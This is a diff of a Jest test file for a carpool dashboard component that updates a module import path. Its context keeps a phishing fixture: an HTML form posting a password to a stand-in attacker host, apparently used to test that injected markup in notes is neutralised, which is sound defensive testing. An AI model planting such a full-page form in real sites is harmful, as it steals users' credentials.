@@ -38,7 +38,7 @@ jest.mock('../../spa/utils/ActivityDateUtils.js', () => ({
   getActivityStartDate: () => null,
 }));
 
-const { CarpoolDashboard } = require('../../spa/carpool_dashboard.js');
+const { CarpoolDashboard } = require('../../spa/modules/carpool/CarpoolDashboard.js');
 
 const PHISHING_NOTE = '<form action="https://evil.example/steal" style="position:fixed;inset:0">'
   + '<input name="password"><button>Sign in</button></form>';
